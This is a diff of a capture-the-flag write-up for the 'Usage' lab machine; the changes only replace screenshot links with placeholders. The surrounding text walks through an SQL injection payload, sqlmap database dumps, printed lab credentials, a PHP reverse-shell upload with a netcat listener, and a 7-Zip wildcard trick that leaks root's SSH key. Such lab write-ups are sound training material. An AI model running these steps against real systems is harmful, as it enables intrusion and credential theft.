@@ -19,9 +19,9 @@ export target=10.129.7.62
 sudo nmap -p- --min-rate 5000 -sT -vvv $target
 ```
 
-<img width="429" height="46" alt="image" src="https://github.com/user-attachments/assets/c6e04adb-4c80-41ac-8a58-257bff2869bc" />
+<img width="429" height="46" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="712" height="217" alt="image" src="https://github.com/user-attachments/assets/0747e3b3-d32e-4b40-99fd-e7f2e3bb6aac" />
+<img width="712" height="217" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Scan Results:**
 - **Port 22**: SSH
@@ -33,7 +33,7 @@ A follow-up service version detection scan was performed:
 sudo nmap -sC -sV -p 22,80 -T4 $target
 ```
 
-<img width="760" height="350" alt="image" src="https://github.com/user-attachments/assets/2d06990d-dfa8-4b57-a67e-8837142e8814" />
+<img width="760" height="350" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 ### Web Application Discovery
 
@@ -43,7 +43,7 @@ The web service running on port 80 revealed a domain-based application. Added th
 echo "10.129.7.62 usage.htb" | sudo tee -a /etc/hosts
 ```
 
-<img width="548" height="151" alt="image" src="https://github.com/user-attachments/assets/b78dd2f9-cc35-43b6-a435-b520b1a2cb1b" />
+<img width="548" height="151" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 ### Subdomain Enumeration
 
@@ -53,7 +53,7 @@ Using FFUF for subdomain enumeration:
 ffuf -c -u 'http://usage.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.usage.htb' -fs 178
 ```
 
-<img width="966" height="528" alt="image" src="https://github.com/user-attachments/assets/b28d7d71-3872-4c68-9e87-f281531eab64" />
+<img width="966" height="528" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 **Discovered Subdomain:**
 - `admin.usage.htb`
@@ -71,21 +71,21 @@ The main application at `http://usage.htb` featured:
 - Registration system
 - Admin navigation links
 
-<img width="1350" height="519" alt="image" src="https://github.com/user-attachments/assets/2689110f-527b-4702-8aba-fb8475956a82" />
+<img width="1350" height="519" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 registering self at http://usage.htb/registration
 
-<img width="957" height="528" alt="image" src="https://github.com/user-attachments/assets/a9355bd9-d81a-458d-9e79-9381a4bb35b9" />
+<img width="957" height="528" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 **Note:visiting http://usage.htb/forget-password
 password reset form when we enter the correct mail we get “We have e-mailed your password reset link to user@mail.com”**
 
-<img width="957" height="432" alt="image" src="https://github.com/user-attachments/assets/cdb17be2-3457-4819-89fc-3226e50cf871" />
+<img width="957" height="432" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 
 **Note:when we give non existant mail we get "Email address does not match in our records!"**
 
-<img width="957" height="432" alt="image" src="https://github.com/user-attachments/assets/0b75eeb2-f5c9-46c3-aa14-9918cd6de76e" />
+<img width="957" height="432" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 ## Initial Access
 
@@ -100,7 +100,7 @@ The password reset functionality at `http://usage.htb/forget-password` was vulne
 ' or 1=1;-- -
 ```
 
-<img width="957" height="432" alt="image" src="https://github.com/user-attachments/assets/969d5617-f274-4454-b9c2-43b72ae46b11" />
+<img width="957" height="432" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 ### Database Enumeration
 
@@ -110,17 +110,17 @@ Using SQLMap for automated exploitation:
 sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10
 ```
 
-<img width="962" height="460" alt="image" src="https://github.com/user-attachments/assets/410c1442-31d3-46a8-975b-a4558fe49047" />
+<img width="962" height="460" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 forget.req
 
-<img width="461" height="691" alt="image" src="https://github.com/user-attachments/assets/2db78713-ed07-4b04-8266-17c25542225d" />
+<img width="461" height="691" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 ```bash
 sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10 --dbs
 ```
 
-<img width="962" height="460" alt="image" src="https://github.com/user-attachments/assets/117af846-38b0-485b-934d-8da70e7b1e28" />
+<img width="962" height="460" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **Discovered Databases:**
 - `information_schema`
@@ -144,7 +144,7 @@ Extracting table names:
 sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10 -D usage_blog --tables
 ```
 
-<img width="891" height="492" alt="image" src="https://github.com/user-attachments/assets/9be984d1-d918-469d-9958-78faa1ffb0d2" />
+<img width="891" height="492" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 
 Extracting administrator credentials:
@@ -153,7 +153,7 @@ Extracting administrator credentials:
 sqlmap -r forget.req --batch --level 5 --risk 3 -p email --threads 10 -D usage_blog -T admin_users --dump
 ```
 
-<img width="961" height="289" alt="image" src="https://github.com/user-attachments/assets/11413698-93d3-47d6-835a-b11ad2e3d2d1" />
+<img width="961" height="289" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 **Administrator Credentials:**
 - **Username**: `admin`
@@ -175,7 +175,7 @@ Successfully logged into the admin panel at `http://admin.usage.htb/` using the 
 - **Username**: `admin`
 - **Password**: `whatever1`
 
-<img width="948" height="447" alt="image" src="https://github.com/user-attachments/assets/d6332db8-f392-454d-b6f3-0393ebc2a27c" />
+<img width="948" height="447" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 
 **Technology Stack Identified:**
@@ -192,7 +192,7 @@ Laravel v10.18.0 was vulnerable to CVE-2023-24249 (Arbitrary File Upload).
 1. **Payload Preparation:**
    - Modified a PHP reverse shell with attacker IP and port
 
-<img width="950" height="466" alt="image" src="https://github.com/user-attachments/assets/4ab3c464-ed1b-4630-ba46-820038af2bb0" />
+<img width="950" height="466" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
    - Set up netcat listener: `nc -nlvp 4444`
 
@@ -200,20 +200,20 @@ Laravel v10.18.0 was vulnerable to CVE-2023-24249 (Arbitrary File Upload).
    - Intercepted the upload request using Burp Suite
    - Modified filename from `hello.php.png` to `hello.php`
 
-<img width="941" height="604" alt="image" src="https://github.com/user-attachments/assets/7fd020bf-c142-43ff-8b61-0818e1b2b930" />
+<img width="941" height="604" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 
 3. **Shell Execution:**
    - Accessed the uploaded shell at `http://admin.usage.htb/uploads/images/hello.php`
    - Obtained reverse shell as user `dash`
 
-<img width="855" height="391" alt="image" src="https://github.com/user-attachments/assets/89ac4dc7-f075-4d99-8993-61cd7283ebd0" />
+<img width="855" height="391" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur" />
 
 ### Stabilizing the Shell
 
 Upgraded to a fully interactive TTY shell for better control.
 
-<img width="629" height="443" alt="image" src="https://github.com/user-attachments/assets/95cf9dcd-abd3-4e00-9a31-0eb44916e120" />
+<img width="629" height="443" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur" />
 
 ## Privilege Escalation
 
@@ -264,7 +264,7 @@ su xander
 
 **Password**: `3nc0d3d_pa$$w0rd`
 
-<img width="603" height="918" alt="image" src="https://github.com/user-attachments/assets/56663d2b-6d65-45bb-9165-fb48b178de3d" />
+<img width="603" height="918" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-21-Upload-To-Imgur" />
 
 
 ### Privilege Escalation Vector
@@ -275,7 +275,7 @@ Analyzed sudo privileges for xander:
 sudo -l
 ```
 
-<img width="757" height="151" alt="image" src="https://github.com/user-attachments/assets/2da02123-de1d-425e-a5b3-3ad6af59b27a" />
+<img width="757" height="151" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-22-Upload-To-Imgur" />
 
 **Sudo Privileges:**
 - User xander can execute `/usr/bin/usage_management` as root without password
@@ -307,7 +307,7 @@ Exploited 7-Zip's wildcard handling vulnerability:
    touch @file
    ```
 
-<img width="463" height="135" alt="image" src="https://github.com/user-attachments/assets/6b98cef2-ea99-415b-aa29-04625a29efdb" />
+<img width="463" height="135" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-23-Upload-To-Imgur" />
 
 2. **Execute Privileged Binary:**
    ```bash
@@ -319,7 +319,7 @@ Exploited 7-Zip's wildcard handling vulnerability:
    - The backup process followed symbolic links
    - Root's private SSH key was included in the backup
 
-<img width="904" height="713" alt="image" src="https://github.com/user-attachments/assets/2675a01c-e59a-40fb-a659-4b96016a59d3" />
+<img width="904" height="713" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-24-Upload-To-Imgur" />
 
 ### Root Shell Access
 
@@ -333,7 +333,7 @@ Exploited 7-Zip's wildcard handling vulnerability:
    ssh -i root_key root@10.129.7.62
    ```
 
-<img width="631" height="497" alt="image" src="https://github.com/user-attachments/assets/640e73f4-bc59-41dd-9006-e4ba24de240a" />
+<img width="631" height="497" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-25-Upload-To-Imgur" />
 
 ### Root Flag Capture
 
